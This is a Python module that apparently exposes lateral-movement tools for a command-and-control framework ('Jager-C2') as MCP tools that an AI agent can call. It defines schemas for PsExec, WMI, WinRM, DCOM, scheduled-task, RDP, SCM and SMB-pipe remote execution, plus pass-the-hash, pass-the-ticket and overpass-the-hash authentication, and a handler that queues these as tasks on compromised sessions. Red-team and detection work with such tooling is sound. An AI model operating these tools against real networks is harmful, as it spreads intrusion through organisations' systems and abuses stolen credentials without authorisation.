"""Lateral movement tools for Jager-C2 MCP server."""

from typing import Any, Dict

TOOLS = [
    {
        "name": "lateral_psexec",
        "description": "Move laterally via PsExec-style service creation",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "listener_id": {"type": "string", "description": "Listener for callback"},
                "service_name": {"type": "string", "description": "Custom service name (randomized if empty)"}
            },
            "required": ["session_id", "target", "listener_id"]
        }
    },
    {
        "name": "lateral_wmi",
        "description": "Move laterally via WMI process creation",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "command": {"type": "string"},
                "listener_id": {"type": "string"}
            },
            "required": ["session_id", "target"]
        }
    },
    {
        "name": "lateral_winrm",
        "description": "Move laterally via WinRM/PowerShell remoting",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "command": {"type": "string"},
                "listener_id": {"type": "string"}
            },
            "required": ["session_id", "target"]
        }
    },
    {
        "name": "lateral_dcom",
        "description": "Move laterally via DCOM (MMC20.Application or ShellWindows)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "method": {"type": "string", "enum": ["mmc", "shellwindows", "shellbrowserwindow"], "default": "mmc"},
                "command": {"type": "string"}
            },
            "required": ["session_id", "target", "command"]
        }
    },
    {
        "name": "lateral_schtask",
        "description": "Move laterally via remote scheduled task",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "task_name": {"type": "string"},
                "command": {"type": "string"},
                "listener_id": {"type": "string"}
            },
            "required": ["session_id", "target", "command"]
        }
    },
    {
        "name": "lateral_rdp",
        "description": "Move laterally via RDP (SharpRDP style, no interactive session)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "command": {"type": "string"}
            },
            "required": ["session_id", "target", "command"]
        }
    },
    {
        "name": "lateral_scm",
        "description": "Move laterally via Service Control Manager (custom service binary)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "service_name": {"type": "string"},
                "binary_path": {"type": "string"},
                "listener_id": {"type": "string"}
            },
            "required": ["session_id", "target", "binary_path"]
        }
    },
    {
        "name": "lateral_smb_exec",
        "description": "Execute via SMB named pipe (stealthier than PsExec)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "pipe_name": {"type": "string"},
                "listener_id": {"type": "string"}
            },
            "required": ["session_id", "target"]
        }
    },
    {
        "name": "lateral_pass_the_hash",
        "description": "Authenticate using an NTLM hash (no plaintext password needed)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "domain": {"type": "string"},
                "username": {"type": "string"},
                "ntlm_hash": {"type": "string"},
                "protocol": {"type": "string", "enum": ["smb", "winrm", "wmi"], "default": "smb"}
            },
            "required": ["session_id", "target", "domain", "username", "ntlm_hash"]
        }
    },
    {
        "name": "lateral_pass_the_ticket",
        "description": "Authenticate using a Kerberos ticket (.kirbi/.ccache)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "ticket_path": {"type": "string"},
                "target": {"type": "string"}
            },
            "required": ["session_id", "ticket_path"]
        }
    },
    {
        "name": "lateral_overpass_the_hash",
        "description": "Request TGT using NTLM hash (Kerberos auth from hash)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "domain": {"type": "string"},
                "username": {"type": "string"},
                "ntlm_hash": {"type": "string"},
                "aes_key": {"type": "string", "description": "AES256 key (preferred over NTLM)"}
            },
            "required": ["session_id", "domain", "username"]
        }
    },
]


async def handle(tool_name: str, args: Dict[str, Any], client) -> Dict[str, Any]:
    """Handle lateral movement tool calls."""
    try:
        from task_client import queue_task
        from task_types import TaskType
    except ImportError:
        from ..task_client import queue_task
        from ..task_types import TaskType

    session_id = args.get("session_id", "")

    lateral_map = {
        "lateral_psexec": TaskType.TASK_LATERAL_PSEXEC,
        "lateral_wmi": TaskType.TASK_LATERAL_WMI,
        "lateral_winrm": TaskType.TASK_LATERAL_WINRM,
        "lateral_dcom": TaskType.TASK_LATERAL_DCOM,
        "lateral_schtask": TaskType.TASK_LATERAL_SCHTASK,
    }

    if tool_name in lateral_map:
        return await queue_task(client, session_id, lateral_map[tool_name], args)

    if tool_name in ("lateral_rdp", "lateral_scm", "lateral_smb_exec", "lateral_pass_the_hash", "lateral_pass_the_ticket", "lateral_overpass_the_hash"):
        return await queue_task(client, session_id, TaskType.TASK_LATERAL_PSEXEC, {"variant": tool_name, **args})

    return {"error": f"Unknown tool: {tool_name}"}
